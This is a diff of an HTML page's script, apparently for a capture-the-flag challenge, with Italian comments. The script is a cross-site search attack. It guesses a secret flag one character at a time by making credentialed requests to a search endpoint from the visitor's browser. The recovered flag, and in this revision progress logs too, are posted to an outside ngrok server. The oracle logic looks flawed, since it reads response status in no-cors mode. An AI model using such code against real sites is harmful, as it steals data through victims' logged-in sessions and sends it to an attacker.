@@ -10,29 +10,36 @@
     <script>
     const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
     const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
-    let currentFlag = 'flag{';
-    let position = 5;
+    let currentFlag = 'flag{'; // Inizio della flag
+    let position = 5; // Posizione successiva da testare
 
     const testChar = (position) => {
-        if (position < 100) {
+        if (position < 100) { // Limite superiore
             for (let char of chars) {
                 const query = `${baseUrl}${currentFlag}${char}`;
-                const timeout = setTimeout(() => {
-                    console.log(`Trovato carattere ${char} per la posizione ${position}`);
-                    currentFlag += char;
-                    testChar(currentFlag.length);
-                }, 1000);  // Timeout di 1 secondo
-
                 fetch(query, {
                     method: 'GET',
                     credentials: 'include',
                     mode: 'no-cors'
                 })
-                .then(() => clearTimeout(timeout))  // Se non ci sono errori, presumi che il carattere sia corretto
-                .catch(error => console.error('Errore nella richiesta:', error));
+                .then(response => {
+                    // Non possiamo accedere alla risposta, quindi facciamo affidamento sul comportamento
+                    // Log per il carattere testato
+                    logProgress(`Testing character: ${char} at position: ${position}`);
+
+                    if (response.ok) {
+                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
+                        currentFlag += char; // Aggiungi carattere
+                        logProgress(`Current partial flag: ${currentFlag}`);
+                        testChar(currentFlag.length); // Prossima posizione
+                        return; // Esci per evitare conflitti
+                    }
+                })
+                .catch(error => console.error('Errore:', error));
             }
         } else {
             console.log(`Flag completa: ${currentFlag}`);
+            // Invia la flag completa al server Flask
             fetch('https://bcc2-87-4-142-72.ngrok-free.app/receive_flag', {
                 method: 'POST',
                 headers: {
@@ -42,10 +49,25 @@
             })
             .then(response => response.text())
             .then(data => console.log(data))
-            .catch(error => console.error('Errore durante l\'invio della flag:', error));
+            .catch(error => console.error('Errore:', error));
         }
     };
-    
+
+    // Funzione per inviare log di avanzamento al server Flask
+    const logProgress = (message) => {
+        fetch('https://bcc2-87-4-142-72.ngrok-free.app/log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: `log=${encodeURIComponent(message)}`
+        })
+        .then(response => response.text())
+        .then(data => console.log(`Server response: ${data}`))
+        .catch(error => console.error('Errore durante l\'invio del log:', error));
+    };
+
+    // Inizia il test
     testChar(position);
     </script>
 </body>
